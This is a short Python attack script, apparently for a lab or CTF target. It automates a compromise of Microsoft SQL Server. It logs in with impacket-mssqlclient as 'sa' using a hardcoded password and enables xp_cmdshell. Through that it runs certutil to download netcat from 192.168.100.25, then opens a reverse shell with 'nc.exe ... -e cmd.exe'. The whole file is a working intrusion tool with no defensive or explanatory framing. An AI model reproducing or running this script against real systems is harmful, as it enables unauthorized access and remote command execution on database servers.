import pexpect
import time

def enable_cmdshell():
    child.sendline("sp_configure 'show advanced options', '1'")
    print("Enabling xp_endshell")
    child.expect(confirmation)
    child.sendline("RECONFIGURE")
    child.sendline("sp_configure 'xp_cmdshell', '1'")
    child.expect(confirmation)
    child.sendline("RECONFIGURE")
    spawn_shell()

def spawn_shell():
    print("Sube el netcat...")
    child.sendline(r"EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://192.168.100.25/nc.exe C:/Users/vitco/Documents/nc.exe'")
    time.sleep(5)
    print("Generando shell...")
    child.sendline(r"EXEC master..xp_cmdshell 'C:/Users/vitco/Documents/nc.exe 192.168.100.25 443 -e cmd.exe'")
    time.sleep(5)
    print("Cerrando...")
    child.close()

def connect():
    print("Conectando a la base de datos de MSSQL...")
    child.expect(pass_prompt)
    child.sendline('Passw0rd')
    print("Accediendo...")
    child.expect(sql_prompt)
    print("Conectado!...")

if __name__ == '__main__':
    sql_prompt = "SQL>"
    confirmation = "para instalar\."
    pass_prompt = "Password:"
    command = "impacket-mssqlclient sa@192.168.100.25"
    child = pexpect.spawn(command)
    connect()
    enable_cmdshell()

